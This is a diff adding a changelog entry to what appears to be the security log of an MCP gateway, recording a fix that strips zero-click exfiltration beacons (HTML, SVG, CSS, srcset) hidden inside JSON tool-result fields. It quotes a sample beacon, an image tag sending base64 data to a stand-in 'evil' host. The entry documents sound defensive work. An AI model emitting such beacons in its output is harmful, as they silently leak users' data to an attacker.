@@ -510,6 +510,19 @@
       Evidence mcp-parallel/findings/backstop-p-result-exfil-beacon/finding.md. RESIDUAL: HTML <img>/srcset
       nested in a JSON result field NOT defanged (whole-payload JSON scan escapes attribute quotes; HTML
       regexes miss them) — markdown/bare-URL ARE defanged; per-field neutralization is a future item.
+      -> CLOSED by CHG-0097.
+      CHG-0097 (2026-07-03, HIGH zero-click exfil — CLOSES the CHG-0096 residual): HTML/SVG/CSS/srcset exfil
+      beacons NESTED in a JSON tool-result field. The MCP tier-1 target (target_mode=entire) is the whole
+      payload JSON-serialized, so HTML attr quotes are escaped (src=\"...\") and neutralize_exfil_channels's
+      HTML regexes (expecting real quotes) miss them; markdown (no quotes) survived and defanged, HTML did not.
+      FIX: _neutralize_exfil_deep(text) (mcp_scan_orchestrator.py) — if the target is JSON, parse it, neutralize
+      each UNESCAPED string LEAF, re-serialize (HTML/srcset/CSS/SVG defang correctly, valid JSON escaping kept);
+      non-JSON neutralized directly; returns original unchanged when nothing defanged (benign byte-identical).
+      _scan_text_tier1 calls it instead of neutralize_exfil_channels (CHG-0096 finding+floor wiring unchanged).
+      +8 tests. Gate: 18 + 1576 gateway passed 0 failed; broker 108. Byte-level: <img src="https://evil/?d=<b64>">
+      -> <img src=\"[exfil-redacted]\">; benign cdn img unchanged. Evidence mcp-parallel/findings/backstop-p-
+      result-exfil-html-nested/finding.md. The MCP result path now defangs markdown/bare-URL/protocol-relative/
+      HTML-media/srcset/CSS-url/SVG-href zero-click beacons (chat-guard parity).
       CHG-0061 (2026-07-02, HIGH — ext_mcp_proxy non-200 / non-JSON egress leak): the tenant-facing
       external passthrough ext_mcp_proxy (/v1/mcp/ext-proxy/{host}/{path}) ran its outbound result/error
       redaction floor ONLY on status==200 JSON bodies — so a NON-JSON body (HTML/text/xml error page;
